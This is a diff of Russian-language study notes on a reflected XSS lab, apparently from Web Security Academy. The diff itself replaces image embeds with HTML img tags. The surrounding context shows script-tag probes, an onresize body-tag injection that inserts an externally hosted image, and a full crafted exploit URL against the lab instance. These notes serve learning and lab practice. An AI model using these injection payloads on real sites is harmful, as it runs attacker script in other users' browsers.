@@ -9,7 +9,8 @@
 
 ----
 первич разведка
-![[xss0122reflect.png]]
+<img src="../../../assets/xss0122reflect.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 
 подставляется между тегами
@@ -54,7 +55,8 @@ print(1)   - не блокируется
 ```html
 <h1>0 search results for '%3Cscript>print()</script>'</h1>
 ```
-![[xssrefle02.png]]
+<img src="../../../assets/xssrefle02.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 ------
 нужно сменить вектор атак / сменить теги
@@ -601,7 +603,9 @@ onresize    растянуть окно !
 '><body onresize="var img=document.createElement('img'); img.src='https://yt3.googleusercontent.com/SPzB93G2bsvMo-D51hWZRm00Mj8h0fkzJHwXWps_nLs-LfF_MlyBAmIggNlwL9TFw5gJodX6Q5k=s900-c-k-c0x00ffffff-no-rj'; document.body.appendChild(img)">
 ```
 
-![[Снимок экрана 2026-02-21 в 15.35.24 (1).png]]
+<img src="../../../assets/xssutt.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
+
 вот сформированная ссылка
 `https://0ac400540403917e84d45ef4003b0019.web-security-academy.net/?search=%27%3E%3Cbody+onresize%3D%22var+img%3Ddocument.createElement%28%27img%27%29%3B+img.src%3D%27https%3A%2F%2Fyt3.googleusercontent.com%2FSPzB93G2bsvMo-D51hWZRm00Mj8h0fkzJHwXWps_nLs-LfF_MlyBAmIggNlwL9TFw5gJodX6Q5k%3Ds900-c-k-c0x00ffffff-no-rj%27%3B+document.body.appendChild%28img%29%22%3E`
 
